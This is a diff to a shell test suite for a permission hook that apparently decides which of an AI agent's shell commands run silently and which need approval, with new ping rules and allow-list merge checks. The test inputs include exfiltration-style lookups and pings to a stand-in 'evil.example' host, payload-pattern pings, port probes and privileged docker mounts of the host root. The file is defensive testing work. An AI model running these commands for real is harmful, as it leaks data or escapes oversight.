@@ -391,6 +391,28 @@ expect_ask 'host /usr/bin/ssh root@10.0.0.2' "reaches the network"
 expect_ask 'dig +short TXT what-it-read.evil.example' "reaches the network"
 expect_ask 'host nslookup example.com 1.1.1.1' "reaches the network"
 expect_ask 'nc -zv 192.168.1.5 445' "reaches the network"
+# ping: a short ping to an address is silent (the allow list lets it run);
+# anything else about ping asks.
+expect_allowed 'ping -c 4 -W 2 194.90.1.5'
+expect_allowed 'host ping -c 3 192.168.1.1'
+expect_allowed 'ping -c 2 -n 2606:4700:4700::1111'
+expect_allowed 'ping -c 10 -q fe80::1%eth0 2>&1'
+expect_allowed 'ping -4 -c1 1.1.1.1'
+expect_ask 'ping -c 4 plex.lan' "ping to a name"
+expect_ask 'ping -c 1 what-it-read.evil.example' "ping to a name"
+expect_ask 'host ping -c 1 what-it-read.evil.example' "ping to a name"
+expect_ask 'ping 1.1.1.1' "ping to a name"                      # no count: never ends
+expect_ask 'ping -c 100 1.1.1.1' "ping to a name"
+expect_ask 'ping -c 2 -p deadbeef 1.1.1.1' "ping to a name"
+expect_ask 'ping -f -c 5 1.1.1.1' "ping to a name"
+expect_ask 'ping -c 2 -s 1400 1.1.1.1' "ping to a name"
+expect_ask 'ping -c 1 1.1.1.1; ping -c 1 what-it-read.evil.example' "ping to a name"
+expect_ask 'ping -c 1 1.1.1.1 && cat /etc/hostname' "ping to a name"   # only ping on its own is plain
+expect_ask 'docker ps; /bin/ping -c 2 what-it-read.evil.example' "ping to a name"
+expect_ask 'host sh -c "ping -c 1 what-it-read.evil.example"' "ping to a name"
+expect_ask 'LANG=C ping -c 1 what-it-read.evil.example' "ping to a name"
+expect_allowed 'docker logs nginx | grep ping'
+expect_allowed 'cat /var/log/ping.log'
 expect_ask 'docker run --privileged -v /:/host alpine sh' "host-level access"
 expect_ask 'docker run -d --net=host --pid=host nginx' "host-level access"
 expect_ask 'docker run -v /var/run/docker.sock:/var/run/docker.sock portainer' "host-level access"
@@ -717,7 +739,7 @@ bash "$BIN/claude-settings-merge" "$DEFAULTS" "$TMP/v4.json" "$VERS" 4 > "$TMP/m
 if jq -e '.permissions.allow | (index("Bash(inspect *)") != null) and (index("Bash(discord-send *)") != null) and (index("Read(//host/boot/**)") != null)' "$TMP/merged5.json" >/dev/null; then pass "allow entries newer than the stamp are added"; else fail "new allow entries not added"; fi
 if jq -e '.permissions.allow | (index("Bash(logs *)") == null) and (.[0:2] == ["Bash(docker ps *)", "Bash(my-own-tool *)"])' "$TMP/merged5.json" >/dev/null; then pass "older entries the user lacks stay out, the user's own stay first"; else fail "allow list changed beyond the new entries"; fi
 added=$(bash "$BIN/claude-settings-merge" --new-allow "$DEFAULTS" "$TMP/v4.json" "$VERS" 4 | sort | tr '\n' ' ')
-if [ "$added" = "Bash(discord-send *) Bash(inspect *) Read(//host/boot/**) " ]; then pass "--new-allow lists what would be added"; else fail "--new-allow output wrong: $added"; fi
+if [ "$added" = "Bash(discord-send *) Bash(host ping *) Bash(inspect *) Bash(ping *) Read(//host/boot/**) " ]; then pass "--new-allow lists what would be added"; else fail "--new-allow output wrong: $added"; fi
 bash "$BIN/claude-settings-merge" "$DEFAULTS" "$TMP/v4.json" "$VERS" "$SV" > "$TMP/merged6.json"
 if jq -e '.permissions.allow == ["Bash(docker ps *)", "Bash(my-own-tool *)"]' "$TMP/merged6.json" >/dev/null; then pass "an up-to-date install gets no allow entries"; else fail "allow entries added to an up-to-date install"; fi
 bash "$BIN/claude-settings-merge" "$DEFAULTS" "$TMP/merged5.json" "$VERS" 4 > "$TMP/merged7.json"
